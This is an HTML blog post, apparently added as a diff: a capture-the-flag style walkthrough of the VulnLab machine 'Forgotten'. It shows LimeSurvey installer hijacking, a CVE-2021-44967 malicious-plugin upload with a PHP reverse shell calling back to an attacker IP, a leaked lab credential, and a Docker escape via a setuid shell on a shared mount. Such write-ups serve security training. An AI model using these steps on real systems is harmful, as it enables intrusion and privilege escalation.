@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>VulnLab: Forgotten | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../../../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <!-- Cover Image - now aligned left and inline with title -->
+            <img src="../img/Forgotten/cover.png" alt="cover" style="height: 80px; border-radius: 4px;">
+
+            <!-- Title Section -->
+            <div>
+                <h1 style="margin: 0;">Vulnlab: Forgotten</h1>
+                <div class="post-meta">April 5, 2025 VulnLab</div>
+            </div>
+        </header>
+
+
+
+
+
+
+
+
+        <!-- Recon Section -->
+        <h1>
+            <p style="color:red;">Reconnaissance</p>
+        </h1>
+
+        First we start with an nmap scan to see what ports are open on this machine.
+<pre class="terminal"><code>
+    $ nmap -sV -sC -T5 -p- 10.10.78.218
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:�
+    |   256 e9:c5:61:e4:eb:23:00:cd:76:96:1f:9a:8b:88:5c:f1 (ECDSA)
+    |_  256 1d:7c:c1:65:ee:87:f8:8f:2b:32:74:2e:43:8d:e7:35 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.56
+    |_http-server-header: Apache/2.4.56 (Debian)
+    | http-methods:�
+    |_  Supported Methods: HEAD GET POST OPTIONS
+    |_http-title: 403 Forbidden
+    Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+</code></pre>
+
+
+
+
+
+        <!-- Enumeration/Entire post -->
+        <h1 style="color:red;">Enumeration</h1>
+
+        <p>
+
+            <br />
+            <br />
+
+            Web enumeration
+<pre class="terminal"><code>
+    gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://10.10.87.193 -x php,html
+    ===============================================================
+    Gobuster v3.6
+    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+    ===============================================================
+    [+] Url:                     http://10.10.87.193
+    [+] Method:                  GET
+    [+] Threads:                 10
+    [+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt
+    [+] Negative Status codes:   404
+    [+] User Agent:              gobuster/3.6
+    [+] Extensions:              php,html
+    [+] Timeout:                 10s
+    ===============================================================
+    Starting gobuster in directory enumeration mode
+    ===============================================================
+    /survey               (Status: 301) [Size: 313] [--> http://10.10.87.193/survey/]
+</code></pre>
+
+
+
+
+            <br />
+            <br />
+            This survey page is asking us to setup/install database for LimeSurvey
+            <br />
+            <img src="../img/Forgotten/1.png" alt="1"
+            <br />
+            We are going to create a database temporarily to set this up and hope it  gives us more access to the site.
+
+            <br />
+            <br />
+            sql commands to setup a database
+
+<pre class="terminal"><code>
+    CREATE DATABASE limesurvey_db;�
+    CREATE USER 'limesurvey_user'@'localhost' IDENTIFIED BY 'your_password';
+    GRANT ALL PRIVILEGES ON limesurvey_db.* TO 'limesurvey_user'@'localhost';�
+    FLUSH PRIVILEGES;�
+    EXIT;
+</code></pre>
+
+            <br />
+            <br />
+            Now we need to edit some files to allow connections from this machine.
+
+<pre class="terminal"><code>
+    sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf
+    bind-address = 0.0.0.0 #Change from localhost to 0.0.0.0
+</code></pre>
+            <br />
+
+<pre class="terminal"><code>
+    sudo systemctl restart mariadb
+</code></pre>
+
+            <br />
+            Allow access to database from machine ip
+<pre class="terminal"><code>
+    sudo iptables -A INPUT -p tcp -s 10.10.78.218 --dport 3306 -j ACCEPT
+
+    sudo iptables -A INPUT -p tcp --dport 3306 -j DROP
+</code></pre>
+            <br />
+            <br />
+            Grant access to our database from the machine ip
+
+<pre class="terminal"><code>
+    sudo mysql -u root -p
+
+    CREATE USER 'limesurvey_user'@'10.10.78.218' IDENTIFIED BY 'your_password';
+    GRANT ALL PRIVILEGES ON limesurvey_db.* TO 'limesurvey_user'@'10.10.78.218';
+    FLUSH PRIVILEGES;
+    EXIT;
+</code></pre>
+
+
+            <br />
+            <br />
+            Once we finish this we will want to make sure we revert these changes back to normal
+<pre class="terminal"><code>
+    sudo ufw delete allow from 10.10.78.218 to any port 3306
+
+    sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf
+
+    bind-address = 127.0.0.1 # change bind address back to 127.0.0.1
+</code></pre>
+
+            <br />
+            <br />
+            <h1><strong>Start the installation for LimeSurvey</strong></h1>
+            <br />
+            <br />
+            <br />
+
+            We will point it at our database on our machine
+            <img src="../img/Forgotten/2.png" alt="2"
+
+
+
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            It should find our database and recognize that it exists.
+            <img src="../img/Forgotten/3.png" alt="3"
+
+
+
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            Once done we should be given credentials to login to the website.
+            <img src="../img/Forgotten/4.png" alt="4"
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+
+
+            We have RCE with this CVE and a good walkthrough of this exploit here.
+            <br />
+            <br />
+            <a href="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE">Limesurvey-RCE</a>
+            <br />
+            <a href="https://ine.com/blog/cve-2021-44967-limesurvey-rce">CVE-2021-44967 Walkthrough</a>
+
+            <br />
+            <br />
+            <br />
+            Downloading the exploit from github above we need to make a few changes. We need to edit the config.xml file and the php-rev.php file then zip it up.
+            <br />
+            <br />
+            <pre class="terminal"><code>
+    ┌──(kali㉿kali)-[~/Desktop/Vulnlab/Forgotten/Limesurvey-RCE]
+    └─$ ls
+    config.xml  exploit.py  php-rev.php  README.md Y1LD1R1M.zip
+
+</code></pre>
+
+            <br />
+            <br />
+            We need to change the config.xml file to look like the file below
+            </pre><pre class="terminal"><code>
+    ──(kali㉿kali)-[~/Desktop/Vulnlab/Forgotten/Limesurvey-RCE]
+    └─$ cat config.xml
+    &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+    &lt;config&gt;
+    &lt;metadata&gt;
+    &lt;name&gt;Y1LD1R1M&lt;/name&gt;
+    &lt;type&gt;plugin&lt;/type&gt;
+    &lt;creationDate&gt;2020-03-20&lt;/creationDate&gt;
+    &lt;lastUpdate&gt;2020-03-31&lt;/lastUpdate&gt;
+    &lt;author&gt;Y1LD1R1M&lt;/author&gt;
+    &lt;authorUrl&gt;https://github.com/Y1LD1R1M-1337&lt;/authorUrl&gt;
+    &lt;supportUrl&gt;https://github.com/Y1LD1R1M-1337&lt;/supportUrl&gt;
+    &lt;version&gt;5.0&lt;/version&gt;
+    &lt;license&gt;GNU General Public License version 2 or later&lt;/license&gt;
+    &lt;description&gt;
+    &lt;![CDATA[Author : Y1LD1R1M]]&gt;&lt;/description&gt;
+    &lt;/metadata&gt;
+
+    &lt;compatibility&gt;
+    &lt;version&gt;3.0&lt;/version&gt;
+    &lt;version&gt;6.3.7&lt;/version&gt; # CHANGE THIS VERSION TO THE VERSION OF LIME SURVEY
+    &lt;/compatibility&gt;
+    &lt;updaters disabled="disabled"&gt;&lt;/updaters&gt;
+    &lt;/config&gt;
+
+</code></pre>
+
+
+            <br />
+            <br />
+            <br />
+            Now we need to change the reverse shell to our IP
+<pre class="terminal"><code>
+    ──(kali㉿kali)-[~/Desktop/Vulnlab/Forgotten/Limesurvey-RCE]
+    └─$ cat php-rev.php
+
+    set_time_limit (0);
+    $VERSION = "1.0";
+    $ip = '10.8.5.199';  // CHANGE THIS
+    $port = 443;       // CHANGE THIS
+    $chunk_size = 1400;
+    $write_a = null;
+    $error_a = null;
+    $shell = 'uname -a; w; id; /bin/sh -i';
+    $daemon = 0;
+    $debug = 0;
+
+    SNIP.....
+
+</code></pre>
+
+            <br />
+            <br />
+            <br />
+            After those changes have been made we can zip up our exploit and upload it to the web page.
+
+<pre class="terminal"><code>
+    ┌──(kali㉿kali)-[~/Desktop/Vulnlab/Forgotten/Limesurvey-RCE]
+    └─$ zip -r Y1LD1R1M_new.zip config.xml php-rev.php
+    adding: config.xml (deflated 56%)
+    adding: php-rev.php (deflated 61%)
+
+</code></pre>
+
+
+            <br />
+            <br />
+            <br />
+
+            Once logged in we go to  Configuration -> Plugins -> Upload & Install
+            <br />
+            <br />
+            <br />
+            Click upload and install at the top and upload our zipped folder
+            <img src="../img/Forgotten/upload.png" alt="upload"
+
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            Next we need to activate the malicious plugin
+            <br />
+            <br />
+            <br />
+            <img src="../img/Forgotten/5.png" alt="5"
+            <br />
+            <br />
+            <br />
+            Once activated we can access the file at this url, this took a bit to figure out but after reading the exploit.py code it was easy to understand.
+            <br />
+            <a href="http://10.10.78.218/survey/upload/plugins/Y1LD1R1M/php-rev.php">http://10.10.78.218/survey/upload/plugins/Y1LD1R1M/php-rev.php</a>
+            <br />
+            <br />
+            Once we navigate to the shell file we will get a callback to our machine.
+            <br />
+            <br />
+            <img src="../img/Forgotten/6.png" alt="6"
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+
+
+            Looking at the hostname of efaa6f5097ed its safe to assume we are probably in a docker container and linpeas will confirm that.
+
+            <img src="../img/Forgotten/7.png" alt="7"
+
+
+
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+
+            Our user is in the sudo group but we need to find a password to be able to exploit this.
+            <img src="../img/Forgotten/8.png" alt="8"
+
+
+
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            I missed this initially but found it later scrolling through linpeas output, we find valid credentials for limesvc.
+            <br />
+            <br />
+            <br />
+            limesvc:5W5HN4K4GCXf9E
+
+            <img src="../img/Forgotten/9.png" alt="9"
+
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+
+            We need to get a full shell with this command as without a full shell we cannot use sudo su or su.
+
+            <br />
+            <br />
+            <br />
+
+            <pre class="terminal"><code>
+   limesvc@efaa6f5097ed:/$ script -qc /bin/bash /dev/null
+</code></pre>
+
+            <br />
+            <br />
+            <br />
+            <img src="../img/Forgotten/10.png" alt="10"
+
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+
+            We are root but still stuck in the docker container
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            Testing this password with the actual machine ip and we can ssh in and grab the user flag
+
+
+<pre class="terminal"><code>
+    ┌──(kali㉿kali)-[~/Desktop/Vulnlab/Forgotten/Limesurvey-RCE]
+    └─$ ssh limesvc@10.10.78.218
+    (limesvc@10.10.78.218) Password: 
+    Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-1012-aws x86_64)
+
+    Last login: Sat Dec  2 15:32:15 2023 from 10.10.1.254
+    limesvc@ip-10-10-200-233:~$ ls
+    user.txt
+    limesvc@ip-10-10-200-233:~$ cat user.txt
+    VL{426b3b0a5425049b<snip>}
+</code></pre>
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            After some enumeration we realize the host machine has a folder that is linked to the docker container.
+            <br />
+            <br />
+            <br />
+            /var/www/html/survey is linked to /opt/limesurvey/pwn on the host machine
+            <br />
+            <br />
+            <br />
+
+
+            Create a test file on docker machine
+            <br />
+            <br />
+<pre class="terminal"><code>
+    root@efaa6f5097ed:/var/www/html/survey# mkdir pwn
+    root@efaa6f5097ed:/var/www/html/survey# cd pwn
+    root@efaa6f5097ed:/var/www/html/survey/pwn# touch test.txt
+</code></pre>
+            <br />
+            <br />
+            <br />
+
+
+            Verify the file exists on host machine
+<pre class="terminal"><code>
+    limesvc@ip-10-10-200-233:/opt/limesurvey/pwn$ ls
+    test.txt
+</code></pre>
+
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+
+            Since we are root on the docker container we should be able to exploit this on the actual machine. We are going to copy /bin/sh to this folder and give it special permissions with chmod u+s
+            <br />
+            <br />
+            <br />
+<pre class="terminal"><code>
+    root@efaa6f5097ed:/var/www/html/survey/pwn# cp /bin/sh .
+    root@efaa6f5097ed:/var/www/html/survey/pwn# chmod u+s sh
+</code></pre>
+
+            <br />
+            <br />
+            <br />
+
+            We will see the file show up on the host machine
+            <br />
+            <br />
+            <br />
+<pre class="terminal"><code>
+limesvc@ip-10-10-200-233:/opt/limesurvey/pwn$ ls
+    test.txt sh
+</code></pre>
+
+            <br />
+            <br />
+            <br />
+            And now we can exploit this
+
+            <br />
+            <br />
+            <br />
+
+<pre class="terminal"><code>
+    limesvc@ip-10-10-200-233:/opt/limesurvey/pwn$ ./sh -p
+    # whoami
+    root
+    # hostname
+    ip-10-10-200-233
+</code></pre>
+
+            <br />
+            <br />
+            <br />
+
+            <img src="../img/Forgotten/11.png" alt="11"
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+            <br />
+
+
+            <h1 style="color:red;">Conclusion</h1>
+
+
+            This was the end for Forgotten. It was a really fun machine and was very realistic. Others who have done this machine mentioned they have seen this exact scenario in live engagements.
+
+            <br />
+            <br />
+            <br />
+            <img src="../img/Forgotten/done.png" alt="done"
+
+        </p>
+
+
+
+    </article>
+
+</body>
+</html>
